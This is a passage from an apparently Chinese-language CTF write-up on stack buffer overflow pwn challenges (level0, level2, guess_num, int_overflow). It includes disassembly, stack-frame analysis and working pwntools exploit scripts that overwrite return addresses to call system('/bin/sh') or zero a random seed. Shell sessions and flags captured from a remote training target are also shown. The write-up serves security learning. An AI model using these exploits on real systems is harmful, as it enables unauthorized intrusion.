<p>本题使用<code>p32(0x400596)</code>是不可以的,因为如此打包则只会认为0x88之后只输入了4个字符,那么溢出会挤掉<code>vulnerable_function</code>函数一开始存放返回地址的低位前四个字节,不能保证后面高位四个字节都是0</p>
<p>而<code>p64(0x400596)</code>之后高四字节直接置0,保证返回到<code>callsystem</code>函数</p>
</blockquote>
<p>用kali或者ubuntu执行exp.py</p>
<p><code>python3 exp.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 111.200.241.244 on port 58761: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">level0</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ cat flag</span><br><span class="line">cyberpeace&#123;8efeda8a14caa49a15f88847757ca2d0&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<h2 id="level2">002level2</h2>
<p>本题需要非常熟悉x86-64汇编语言的函数调用过程,能够改变栈顶指针的指令,</p>
<blockquote>
<p>能够改变栈顶指针的指令有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">I.sub/add	显式改变栈顶指针esp</span><br><span class="line"></span><br><span class="line">II.push/pop	压栈退栈,以4字节为单元</span><br><span class="line"></span><br><span class="line">III.leave	函数最后释放自己局部变量的栈空间</span><br><span class="line"></span><br><span class="line">IV.call/retn	</span><br><span class="line">假设P中call Q 1.把P中call Q的下面一条指令压栈,2.Q-&gt;eip即设置程序计数器</span><br><span class="line">一定要注意,在改变程序计数器之前是有一个压栈保存返回地址的</span><br><span class="line"></span><br><span class="line">在刚进入Q函数时,栈顶还是指向返回地址的,</span><br><span class="line">然后对于_cdecl调用约定,会有esp压栈保存,</span><br><span class="line">然后才是Q函数的局部变量的栈空间</span><br><span class="line">而Q函数参数的栈空间是在P函数中分配的</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\level2&gt; checksec --file=level2</span><br><span class="line">[*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\level2\\level2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little				;32位程序</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>直接看反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>32位<code>_cdecl</code>调用约定下,传参不使用寄存器,只使用栈传参,</p>
<p>上述两点使得通过栈缓冲区溢出自己设置参数成为可能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>vulnerable_function</code>函数栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-00000088 buf             db 136 dup(?)</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>根据level0的思路,前140个字节胡乱输入,接下来4个字节写一个可以getshell的函数地址,下面就去找一个这样的函数</p>
<p>先看一下Strings里面有没有/bin/sh类似字样</p>
<p>确实找到一个,但是没有交叉引用,即没有任何函数使用它</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0804A024 hint            db &#x27;/bin/sh&#x27;,0</span><br></pre></td></tr></table></figure>
<p>如果想要获取shell,需要有<code>system('/bin/sh')</code>这种函数调用</p>
<p>因此需要在level0的思路上修改一下,构造一个<code>system('/bin/sh')</code>这种函数调用</p>
<p>上述函数调用,其汇编指令应为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push offset cmd		;cmd为&#x27;/bin/sh&#x27;的地址</span><br><span class="line">call system</span><br></pre></td></tr></table></figure>
<p><code>vulnerable_function</code>函数首先执行一个system函数然后执行read,然后返回</p>
<p>显然地址我们可以使用溢出修改成调用system函数的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0804845C                 call    _system</span><br></pre></td></tr></table></figure>
<p>在此之前,需要保证栈顶放好了<code>'/bin/sh'</code><strong>的地址</strong><code>.data:0804A024 hint            db '/bin/sh',0</code></p>
<p>那么需要精确的计算出栈顶此时的位置(esp栈顶指针与ebp帧指针的距离)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0804844B                 push    ebp</span><br><span class="line">.text:0804844C                 mov     ebp, esp								;esp=ebp=0,ebp在本函数中永远不会变化</span><br><span class="line">.text:0804844E                 sub     esp, 88h        ; buf				 ;esp=-0x88</span><br><span class="line">.text:08048454                 sub     esp, 0Ch								;esp=-0x94</span><br><span class="line">.text:08048457                 push    offset command  ; &quot;echo Input:&quot;		  ;esp=-0x98</span><br><span class="line">.text:0804845C                 call    _system								;esp=-0x98-&gt;-0x9C-&gt;-0x98</span><br><span class="line">.text:08048461                 add     esp, 10h								;esp=-0x88</span><br><span class="line">.text:08048464                 sub     esp, 4								;esp=-0x8C</span><br><span class="line">.text:08048467                 push    100h            ; nbytes				 ;esp=-0x90</span><br><span class="line">.text:0804846C                 lea     eax, [ebp+buf]							</span><br><span class="line">.text:08048472                 push    eax             ; buf				;esp=-0x94</span><br><span class="line">.text:08048473                 push    0               ; fd					;esp=-0x98</span><br><span class="line">.text:08048475                 call    _read								;esp=-0x98-&gt;-0x9C-&gt;-0x98</span><br><span class="line">.text:0804847A                 add     esp, 10h								;esp=-0x88</span><br><span class="line">.text:0804847D                 nop									</span><br><span class="line">.text:0804847E                 leave</span><br><span class="line">.text:0804847F                 retn											;从rbp+4位置退出</span><br></pre></td></tr></table></figure>
<p>在<code>vulnerable_function</code>执行<code>.text:0804847E                 leave</code>之前,栈顶指针相对于帧指针位于<code>-0x88</code>位置恰为buf的起始位置,然后<code>leave</code>的作用是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp																;esp=0</span><br><span class="line">pop ebp																	;esp=+4</span><br></pre></td></tr></table></figure>
<p>然后执行<code>retn</code>,相当于<code>pop eip</code>将本应该是正常返回的地址值交给程序计数器eip,然后程序跳转到该位置(system函数的地址)继续执行</p>
<p>考虑'/bin/sh'的地址作为system参数应该放在那里呢?</p>
<p>当eip中的指令被执行时,参数是此时的栈顶,即<code>esp=+8</code>的位置,这个位置不在<code>vulnerable_function</code>函数栈中,而是在他的调用者<code>main</code>中,但是eip修改之后从<code>vulnerable_function</code>不能返回到<code>main</code>,那么此时栈帧对于<code>main</code>函数来说就无意义了,此时的栈帧可以被任何函数利用</p>
<p>整个过程用表格表示为</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220511210551512.png"
alt="image-20220511210551512" />
<figcaption aria-hidden="true">image-20220511210551512</figcaption>
</figure>
<p>综上,<code>esp∈[ebp-0x88,ebp+0x4)</code>共<code>0x8C</code>个字节随便写,然后<code>[ebp+0x4,ebp+0x8)</code>写system<strong>函数</strong>地址,<code>[ebp+0x8,ebp+0xC)</code>写system的<strong>参数</strong>地址</p>
<blockquote>
<p>ebp+x,x越大越靠近栈底,这里system在<code>[ebp+0x4,ebp+0x8)</code>,其参数在<code>[ebp+0x8,ebp+0xC)</code>,参数相对函数地址是更早的,即更靠近栈底的</p>
</blockquote>
<h3 id="exp-1">exp</h3>
<p>本地测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8C</span>).encode()+p32(<span class="number">0x0804845C</span>)+p32(<span class="number">0x0804A024</span>);</span><br><span class="line">		//前<span class="number">0x8C</span>随便写    + system地址     +参数地址</span><br><span class="line">sh.sendline( payload )</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level2]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./level2&#x27;</span>: pid 72                                                                                                   </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Input:</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">kali</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<p>连接靶机</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=process(&#x27;./level2&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;53153&#x27;</span>)		;连接到攻防世界靶机</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8C</span>).encode()+p32(<span class="number">0x0804845C</span>)+p32(<span class="number">0x0804A024</span>);</span><br><span class="line"></span><br><span class="line">sh.sendline( payload )</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/level2]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 53153: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Input:</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">level2</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;37be55c2ba683c43f9410e5e7400e59d&#125;</span><br></pre></td></tr></table></figure>
<h2
id="guess_num栈缓冲区溢出改变随机数种子">003guess_num(栈缓冲区溢出改变随机数种子)</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\guess_num&gt; checksec guess_num</span><br><span class="line">[*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\guess_num\\guess_num&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h3 id="main">main()</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();					<span class="comment">//生成随机数种子</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to a guess number game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please let me know your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">  gets(v7);										<span class="comment">//v7缓冲区长32字节,这里可以溢出</span></span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )					<span class="comment">//猜数游戏一共需要 玩九次</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">6</span> + <span class="number">1</span>;						<span class="comment">//v6∈[1,6]</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your guess number:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);					<span class="comment">//无法溢出</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )								<span class="comment">//每次成功都需要v4=v6</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();								<span class="comment">//cat flag</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数的栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-000000000000003C var_3C          dd ?					;v4</span><br><span class="line">-0000000000000038 var_38          dd ?					;i</span><br><span class="line">-0000000000000034 var_34          dd ?					;v6</span><br><span class="line">-0000000000000030 var_30          db 32 dup(?)			;v7缓冲区</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br><span class="line">-0000000000000008 var_8           dq ?					;v9</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
<p>从栈帧布局上看,v7溢出无法修改v6,i,v4,只能溢出高地址的seed,var_8,s,r</p>
<p>这里只需要溢出到seed,把它改成0</p>
<p>当随机数种子为0时,其生成的伪随机数序列是固定的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> seed = <span class="number">0</span>;</span><br><span class="line">	srand(seed);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>,rand()%<span class="number">6</span>+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在windows上的运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3  4  5  2  6  2  2  6  5  1</span><br></pre></td></tr></table></figure>
<p>在linux上的运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2  5  4  2  6  2  5  1  4  2 </span><br></pre></td></tr></table></figure>
<p><code>[ebp-30h,ebp-10h)</code>随便写,<code>[ebp-10h,ebp-8h)</code>溢出成0</p>
<h3 id="exp-2">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=process(&#x27;./guess_num&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;61574&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your name:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please input your guess number:&#x27;)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Success!</span><br><span class="line">You are a prophet!</span><br><span class="line">Here is your flag!cyberpeace&#123;60097ace8e8ecc14e7efb47bab0d5ef1&#125;</span><br></pre></td></tr></table></figure>
<h2
id="int_overflow栈缓冲区溢出改变栈中整数">004int_overflow(栈缓冲区溢出改变栈中整数)</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\int_overflow&gt; checksec int_overflow</span><br><span class="line">[*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\int_overflow\\int_overflow&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>直接看String视图,发现有一个</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220519232804685.png"
alt="image-20220519232804685" />
<figcaption aria-hidden="true">image-20220519232804685</figcaption>
</figure>
<p><code>.rodata:08048960 command         db 'cat flag',0         ; DATA XREF: what_is_this+9↑o</code></p>
<p>交叉引用上表明这个字符串出现在<code>what_is_this</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">what_is_this</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然而Function
calls视图上没有任何函数调用该函数,看来需要栈溢出修改函数返回地址调用了</p>
<h3 id="login">login()</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">512</span>]; <span class="comment">// [esp+0h] [ebp-228h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+200h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x19</span>u);<span class="comment">//s缓冲区大小40字节,这里限制最大读入0x19&lt;40,不会溢出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your passwd:&quot;</span>);</span><br><span class="line">  